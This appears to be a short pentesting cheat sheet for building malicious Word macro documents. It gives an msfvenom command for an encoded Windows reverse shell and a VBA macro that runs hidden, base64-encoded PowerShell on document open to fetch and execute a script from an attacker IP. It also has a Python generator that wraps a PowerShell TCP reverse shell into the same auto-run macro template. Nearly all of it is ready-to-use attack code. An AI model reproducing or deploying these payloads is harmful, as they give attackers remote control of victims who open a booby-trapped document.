.docm .docx .doc
### Msfvenom Payload

```shell
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.201.44 LPORT=443 -e x86/shikata_ga_nai -f vba-psh
```


### VB-Powershell

```vb

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
Str = Str + "powershell.exe -nop -w hidden -e cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACcASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADUANwAuADEAMwAxAC8AcwBoAC4AcABzADEAKQA="


    CreateObject("Wscript.Shell").Run Str
End Sub

```

#### Python -> VBA

```python
#!/bin/python3

import base64
import subprocess


payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.157.131",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();'


subprocess = subprocess.Popen('echo -n \''+payload+'\'| iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n" ', shell=True, stdout=subprocess.PIPE)

payload_b64 = subprocess.stdout.read()




str = "powershell.exe -nop -w hidden -e "+str(payload_b64)[1:]

#print(str)


n = 50


print("""
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

	""")



for i in range(0, len(str), n):
 	print ("Str = Str + " + '"' + str[i:i+n] + '"')

print("""

	CreateObject("Wscript.Shell").Run Str
End Sub
	""")
```
